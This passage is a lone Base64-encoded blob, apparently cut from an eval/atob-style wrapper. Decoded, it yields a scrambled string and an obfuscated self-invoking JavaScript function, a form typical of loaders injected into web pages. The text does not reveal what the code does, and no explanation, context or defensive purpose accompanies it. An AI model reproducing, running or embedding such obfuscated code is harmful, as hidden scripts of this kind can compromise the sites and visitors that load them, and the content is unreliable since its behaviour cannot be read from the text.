a2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
